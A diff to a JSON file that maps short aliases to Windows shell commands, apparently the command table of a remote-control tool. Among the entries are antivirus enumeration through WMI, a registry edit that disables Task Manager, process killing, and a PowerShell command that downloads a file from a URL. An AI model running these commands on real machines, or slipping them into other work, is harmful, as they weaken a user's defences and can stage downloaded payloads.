@@ -1,1 +1,12 @@
-{"sc": "screenshot"}
+{
+  "openurl": "pyexec import webbrowser;webbrowser.open('<url>')",
+  "enum_av": "wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName",
+  "startup": "wmic startup get description,location",
+  "pkill": "wmic process where name='<process_name>' call terminate",
+  "touch": "type nul > <filename>",
+  "search": "where /r <path> <filename>",
+  "lockscreen": "rundll32.exe user32.dll,LockWorkStation",
+  "show_desktop": "powershell.exe (New-Object -ComObject shell.application).toggleDesktop()",
+  "disable_taskmgr": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d <0or1> /f",
+  "download_file": "powershell.exe (new-object System.Net.WebClient).DownloadFile('<url>', '<filename>')"
+}
